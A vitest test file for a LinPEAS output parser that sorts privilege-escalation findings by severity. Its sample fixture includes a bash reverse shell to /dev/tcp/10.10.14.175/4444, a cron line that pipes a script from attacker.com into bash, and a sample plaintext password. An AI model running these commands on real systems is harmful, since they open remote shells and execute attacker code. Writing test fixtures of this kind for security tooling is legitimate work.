import { describe, expect, it } from "vitest";
import {
  parseLinPEASOutput,
  parseSUID,
  parseCapabilities,
  parseSudoRules,
  parseCronJobs,
  parseKernelExploits,
  parseWritablePaths,
  parsePasswords,
  parseInterestingFiles,
  parseSystemInfo,
  classifySeverity,
  extractSection,
} from "./index";

const SAMPLE_OUTPUT = `
System Information
Operating System: Ubuntu 22.04 LTS
Kernel Version: 5.15.0-91-generic
Current user: www-data
Groups: www-data, ubuntu
Hostname: web01

[+] SUID Binaries
/usr/bin/sudo
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/umount
/usr/bin/at
-bash -c 'bash -i >& /dev/tcp/10.10.14.175/4444 0>&1'
/usr/bin/find
/usr/bin/nmap
/usr/bin/vim
/opt/recon/bin/recon-shell

[+] Capabilities
/usr/bin/python3.10 cap_setuid+ep
/usr/bin/ping cap_setuid+ep
/usr/bin/gdbserver cap_setuid+ep

[+] Sudo Rules
(root) NOPASSWD: ALL
(www-data) NOPASSWD: /usr/bin/find
(root) SETENV: PATH=/opt/app

[+] Cron Jobs
* * * * * root /opt/cleanup.sh
* * * * * root /usr/local/bin/backup-db >> /var/log/backup.log
*/10 * * * * www-data curl http://attacker.com/payload.sh | bash

[+] Kernel Exploits
Kernel version: 5.15.0-91-generic (vulnerable to CVE-2023-32233)
Possible exploits: linux kernel Stack Clash (CVE-2023-32233)

[+] Writable Paths
-rw-rw-rw- /etc/shadow
-rw-rw-rw- /etc/sudoers.d/
-rw-rw-rw- /var/www/html/config.php
-rw-rw-rw- /opt/app/env

[+] Interesting Files
/home/user/.ssh/id_rsa (found readable SSH private key)
/var/backups/db_dump.sql.gz (found readable database backup)
/etc/environment (found writable environment file)

[+] Credentials
password=SuperSecret123 in /opt/app/.env
`;

describe("classifySeverity", () => {
  it("returns critical for writable /etc/shadow", () => {
    expect(classifySeverity("writable", "/etc/shadow is writable")).toBe("critical");
  });

  it("returns critical for NOPASSWD ALL", () => {
    expect(classifySeverity("sudo", "(root) NOPASSWD: ALL")).toBe("critical");
  });

  it("returns high for dangerous capabilities", () => {
    expect(classifySeverity("capabilities", "cap_setuid")).toBe("high");
    expect(classifySeverity("capabilities", "cap_dac_override")).toBe("high");
  });

  it("returns high for non-standard SUID binaries", () => {
    expect(classifySeverity("suid", "/usr/bin/recon-shell")).toBe("high");
    expect(classifySeverity("suid", "/opt/exploit/suid")).toBe("high");
  });

  it("returns low for standard SUID binaries", () => {
    expect(classifySeverity("suid", "/usr/bin/sudo")).toBe("low");
    expect(classifySeverity("suid", "/usr/bin/nmap")).toBe("low");
  });

  it("returns medium for cron jobs", () => {
    expect(classifySeverity("cron", "* * * * * root /opt/cleanup.sh")).toBe("medium");
  });

  it("returns high for kernel exploits", () => {
    expect(classifySeverity("kernel", "CVE-2023-32233 linux kernel Stack Clash")).toBe("high");
  });
});

describe("extractSection", () => {
  it("extracts the SUID section", () => {
    const section = extractSection(SAMPLE_OUTPUT, "SUID");
    expect(section).not.toBeNull();
    expect(section).toContain("/usr/bin/sudo");
    expect(section).toContain("-bash -c");
  });

  it("extracts the Capabilities section", () => {
    const section = extractSection(SAMPLE_OUTPUT, "Capabilit");
    expect(section).not.toBeNull();
    expect(section).toContain("cap_setuid");
  });

  it("returns null for missing sections", () => {
    expect(extractSection(SAMPLE_OUTPUT, "NonExistent")).toBeNull();
  });
});

describe("parseSUID", () => {
  it("extracts SUID binary paths", () => {
    const findings = parseSUID(SAMPLE_OUTPUT);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings.some((f) => f.detail.includes("-bash -c"))).toBe(true);
  });
});

describe("parseCapabilities", () => {
  it("extracts capabilities", () => {
    const findings = parseCapabilities(SAMPLE_OUTPUT);
    expect(findings.length).toBe(3); // setuid, setuid, setuid
    expect(findings.every((f) => f.severity === "high")).toBe(true);
  });
});

describe("parseSudoRules", () => {
  it("detects NOPASSWD ALL as critical", () => {
    const findings = parseSudoRules(SAMPLE_OUTPUT);
    expect(findings.some((f) => f.detail.includes("NOPASSWD: ALL"))).toBe(true);
    expect(findings[0].severity).toBe("critical");
  });

  it("detects SETENV", () => {
    const findings = parseSudoRules(SAMPLE_OUTPUT);
    expect(findings.some((f) => f.detail.includes("SETENV"))).toBe(true);
  });
});

describe("parseKernelExploits", () => {
  it("finds CVE references", () => {
    const findings = parseKernelExploits(SAMPLE_OUTPUT);
    expect(findings.length).toBe(1);
    expect(findings[0].detail).toContain("CVE-2023-32233");
  });
});

describe("parseWritablePaths", () => {
  it("finds writable /etc/shadow", () => {
    const findings = parseWritablePaths(SAMPLE_OUTPUT);
    expect(findings.some((f) => f.detail.includes("/etc/shadow"))).toBe(true);
  });
});

describe("parsePasswords", () => {
  it("finds passwords in env files", () => {
    const findings = parsePasswords(SAMPLE_OUTPUT);
    expect(findings.some((f) => f.detail.includes("SuperSecret123"))).toBe(true);
  });
});

describe("parseInterestingFiles", () => {
  it("finds SSH keys and backups", () => {
    const findings = parseInterestingFiles(SAMPLE_OUTPUT);
    expect(findings.some((f) => f.detail.includes("id_rsa"))).toBe(true);
    expect(findings.some((f) => f.detail.includes("db_dump.sql.gz"))).toBe(true);
  });
});

describe("parseSystemInfo", () => {
  it("extracts system info from the header", () => {
    const info = parseSystemInfo(SAMPLE_OUTPUT);
    expect(info.hostname).toBe("web01");
    expect(info.os).toContain("Ubuntu 22.04");
    expect(info.kernel).toContain("5.15.0-91-generic");
    expect(info.user).toBe("www-data");
    expect(info.groups).toContain("www-data");
  });
});

describe("parseLinPEASOutput", () => {
  it("parses full output into structured findings", () => {
    const result = parseLinPEASOutput(SAMPLE_OUTPUT);
    expect(result.summary.total_findings).toBeGreaterThan(0);
    expect(result.system_info.hostname).toBe("web01");
    expect(result.findings.length).toBeGreaterThan(10);
  });

  it("applies severity filter", () => {
    const result = parseLinPEASOutput(SAMPLE_OUTPUT, { filterSeverity: "critical" });
    expect(result.findings.every((f) => f.severity === "critical")).toBe(true);
    expect(result.findings.length).toBeLessThan(result.summary.total_findings);
  });

  it("applies type filter", () => {
    const result = parseLinPEASOutput(SAMPLE_OUTPUT, { filterType: "suid" });
    expect(result.findings.every((f) => f.type === "suid")).toBe(true);
  });

  it("returns empty for empty input", () => {
    const result = parseLinPEASOutput("");
    expect(result.summary.total_findings).toBe(0);
    expect(result.findings).toHaveLength(0);
  });
});
